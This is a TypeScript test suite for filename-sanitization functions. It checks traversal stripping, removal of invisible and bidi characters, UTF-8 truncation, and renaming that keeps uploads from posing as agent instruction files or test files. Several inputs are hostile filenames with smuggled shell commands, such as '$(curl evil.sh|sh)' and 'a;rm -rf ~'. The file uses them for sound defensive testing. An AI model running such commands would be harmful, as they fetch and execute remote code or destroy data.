import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { fileNameFromUrl, safeFileName, sanitizeFileName } from "../filename.js";

describe("sanitizeFileName", () => {
  it("keeps ordinary names untouched", () => {
    assert.equal(sanitizeFileName("review_git-delivery-2026-09-18.md"), "review_git-delivery-2026-09-18.md");
    assert.equal(sanitizeFileName("Отчёт за сентябрь.pdf"), "Отчёт за сентябрь.pdf");
    assert.equal(sanitizeFileName("a b (1).tar.gz"), "a b (1).tar.gz");
    assert.equal(sanitizeFileName(".gitignore"), ".gitignore");
  });

  it("reduces traversal attempts to their leaf name", () => {
    assert.equal(sanitizeFileName("../../etc/passwd"), "passwd");
    assert.equal(sanitizeFileName("/etc/shadow"), "shadow");
    assert.equal(sanitizeFileName("/abs/path.md"), "path.md");
    assert.equal(sanitizeFileName("..\\..\\Windows\\System32\\evil.dll"), "evil.dll");
    assert.equal(sanitizeFileName("C:\\Users\\me\\report.docx"), "report.docx");
  });

  it("never returns a value containing a path separator", () => {
    for (const raw of ["../../etc/passwd", "a/b/c", "x\\y\\z", "/", "//", "\\\\srv\\share\\f.txt"]) {
      const out = sanitizeFileName(raw);
      if (out !== null) {
        assert.ok(!out.includes("/"), `'${raw}' → '${out}' still has /`);
        assert.ok(!out.includes("\\"), `'${raw}' → '${out}' still has \\`);
      }
    }
  });

  it("strips NUL and control characters", () => {
    assert.equal(sanitizeFileName("foo\u0000.md"), "foo.md");
    assert.equal(sanitizeFileName("re\u0007port\u001b[31m.md"), "report[31m.md");
    assert.equal(sanitizeFileName("line\nbreak.txt"), "linebreak.txt");
    assert.equal(sanitizeFileName("\u0000"), null);
  });

  it("strips bidi overrides used to spoof the extension", () => {
    // report<RLO>gnp.exe renders as report exe.png in most clients.
    assert.equal(sanitizeFileName("report\u202Egnp.exe"), "reportgnp.exe");
    assert.equal(sanitizeFileName("\u202Ash\u202Cot.png"), "shot.png");
  });

  it("rejects empty and dots-only names", () => {
    assert.equal(sanitizeFileName(""), null);
    assert.equal(sanitizeFileName("   "), null);
    assert.equal(sanitizeFileName("."), null);
    assert.equal(sanitizeFileName(".."), null);
    assert.equal(sanitizeFileName("...."), null);
    assert.equal(sanitizeFileName("../.."), null);
    assert.equal(sanitizeFileName(null), null);
    assert.equal(sanitizeFileName(undefined), null);
  });

  it("caps at 255 bytes while keeping the extension", () => {
    const long = `${"a".repeat(400)}.md`;
    const out = sanitizeFileName(long);
    assert.ok(out);
    assert.ok(Buffer.byteLength(out, "utf8") <= 255, `got ${Buffer.byteLength(out ?? "", "utf8")} bytes`);
    assert.ok(out.endsWith(".md"), "extension must survive truncation");
  });

  it("counts bytes, not code units, for multi-byte names", () => {
    // 200 Cyrillic chars = 400 bytes — a length-based cap would let this through.
    const out = sanitizeFileName(`${"я".repeat(200)}.pdf`);
    assert.ok(out);
    assert.ok(Buffer.byteLength(out, "utf8") <= 255);
    assert.ok(out.endsWith(".pdf"));
    // No broken surrogate/партial code point at the cut.
    assert.ok(!out.includes("\uFFFD"));
  });

  it("does not split a surrogate pair when truncating", () => {
    const out = sanitizeFileName(`${"😀".repeat(100)}.png`);
    assert.ok(out);
    assert.ok(Buffer.byteLength(out, "utf8") <= 255);
    assert.equal(Buffer.from(out, "utf8").toString("utf8"), out, "must be valid UTF-8 after the cut");
  });

  it("handles a long name with no extension", () => {
    const out = sanitizeFileName("b".repeat(300));
    assert.ok(out);
    assert.equal(Buffer.byteLength(out, "utf8"), 255);
  });
});

describe("fileNameFromUrl", () => {
  it("takes the last path segment and drops query/fragment", () => {
    assert.equal(fileNameFromUrl("https://example.com/files/report.pdf"), "report.pdf");
    assert.equal(fileNameFromUrl("https://example.com/a/b/c.md?token=x#frag"), "c.md");
    assert.equal(fileNameFromUrl("https://example.com/files/"), "files");
  });

  it("decodes percent-encoding", () => {
    assert.equal(fileNameFromUrl("https://example.com/%D0%BE%D1%82%D1%87%D1%91%D1%82.pdf"), "отчёт.pdf");
    // Encoded separators must not reintroduce a path.
    assert.equal(fileNameFromUrl("https://example.com/a%2F..%2Fb.txt"), "b.txt");
  });

  it("returns null when there is no usable segment", () => {
    assert.equal(fileNameFromUrl("https://example.com"), null);
    assert.equal(fileNameFromUrl("https://example.com/"), null);
    assert.equal(fileNameFromUrl("not a url"), null);
  });
});

describe("safeFileName (audit M4)", () => {
  it("always namespaces the name as tg-<messageId>-<stem>-tg, keeping a safe extension", () => {
    assert.equal(safeFileName("voice.ogg", 7), "tg-7-voice-tg.ogg");
    assert.equal(safeFileName("report_v2-final.tar.gz", 7), "tg-7-report_v2-final_tar-tg.gz");
    assert.equal(safeFileName(undefined, 7, "ogg"), "tg-7.ogg");
    assert.equal(safeFileName("notes", 7, "txt"), "tg-7-notes-tg.txt");
  });

  it("special files of agents, shells and build tools can never come out", () => {
    const cases: Array<[string, string]> = [
      ["AGENTS.md", "tg-7-AGENTS-tg.md"],
      ["AGENTS.override.md", "tg-7-AGENTS_override-tg.md"],
      ["CLAUDE.md", "tg-7-CLAUDE-tg.md"],
      ["GEMINI.md", "tg-7-GEMINI-tg.md"],
      [".cursorrules", "tg-7-cursorrules-tg.bin"],
      [".bashrc", "tg-7-bashrc-tg.bin"],
      ["Makefile", "tg-7-Makefile-tg.bin"],
      ["package.json", "tg-7-package-tg.json"],
      ["-rf", "tg-7-rf-tg.bin"],
    ];
    for (const [name, expected] of cases) assert.equal(safeFileName(name, 7, "bin"), expected, name);
  });

  it("no test runner picks the file up (audit round 4, L1)", () => {
    const cases: Array<[string, string]> = [
      ["a_test.go", "tg-5-a_test-tg.go"],
      ["x.test.ts", "tg-5-x_test-tg.ts"],
      ["x.spec.js", "tg-5-x_spec-tg.js"],
      ["test_x.py", "tg-5-test_x-tg.py"],
      ["x_test.py", "tg-5-x_test-tg.py"],
      ["conftest.py", "tg-5-conftest-tg.py"],
    ];
    const runnerGlobs = [/_test\.go$/, /\.(test|spec)\.[jt]sx?$/, /^test_.*\.py$/, /_test\.py$/, /^conftest\.py$/];
    for (const [name, expected] of cases) {
      const safe = safeFileName(name, 5);
      assert.equal(safe, expected, name);
      for (const glob of runnerGlobs) assert.doesNotMatch(safe, glob, `${name} -> ${safe}`);
    }
  });

  it("drops a stem that could change a shell command, keeping a safe extension", () => {
    for (const hostile of [
      "$(curl evil.sh|sh).pdf",
      "`id`.pdf",
      "a;rm -rf ~.pdf",
      "it's.pdf",
      'say "hi".pdf',
      "--output=x.pdf",
      "Отчёт.pdf",
      "with space.pdf",
    ]) {
      assert.equal(safeFileName(hostile, 7), "tg-7.pdf", hostile);
    }
  });

  it("drops an unsafe extension and falls back to the given one", () => {
    assert.equal(safeFileName("x.p$f", 7, "pdf"), "tg-7-x-tg.pdf");
    assert.equal(safeFileName("x.p$f", 7), "tg-7-x-tg");
  });

  it("every result starts with tg-<id>, has at most one dot and stays in the documented alphabet", () => {
    for (const name of [
      "a.b",
      "..",
      "$",
      "a/../../b.sh",
      "C:\\x\\y.exe",
      "x".repeat(300),
      "😀.png",
      ".",
      "-",
      "a.b.c.d",
    ]) {
      assert.match(safeFileName(name, 1, "bin"), /^tg-1(-[A-Za-z0-9_-]+-tg)?(\.[A-Za-z0-9]+)?$/, name);
    }
  });
});

describe("sanitizeFileName strips invisible characters (audit round 4, L2)", () => {
  it("drops zero-width, BOM, Arabic letter mark, line/paragraph separators and tag characters", () => {
    const hidden = "re\u200Bport\u200C\u200D\uFEFF\u061C\u2028\u2029\u{E0041}\u{E0049}.pdf";
    assert.equal(sanitizeFileName(hidden), "report.pdf");
    assert.equal(sanitizeFileName("\u200B\u200B"), null, "nothing visible left");
    assert.equal(sanitizeFileName("Отчёт 😀.pdf"), "Отчёт 😀.pdf", "visible text is kept");
  });
});
